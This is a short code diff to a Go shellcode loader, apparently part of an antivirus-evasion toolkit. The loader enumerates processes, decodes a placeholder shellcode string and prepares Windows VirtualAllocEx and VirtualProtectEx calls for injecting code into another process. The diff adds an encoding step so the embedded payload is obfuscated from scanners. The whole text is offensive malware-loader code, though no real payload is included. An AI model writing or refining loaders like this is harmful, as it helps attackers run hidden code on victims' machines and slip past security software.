@@ -3,6 +3,7 @@ package main
 import (
 	"encoding/hex"
 	"fmt"
+	"github.com/EmYiQing/GoBypass/encode"
 	"github.com/mitchellh/go-ps"
 	"golang.org/x/sys/windows"
 	"unsafe"
@@ -20,7 +21,7 @@ func main() {
 			break
 		}
 	}
-	shellcode, _ := hex.DecodeString("__SHELLCODE__")
+	shellcode, _ := hex.DecodeString(encode.Decode("__SHELLCODE__"))
 	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
 	VirtualAllocEx := kernel32.NewProc("VirtualAllocEx")
 	VirtualProtectEx := kernel32.NewProc("VirtualProtectEx")
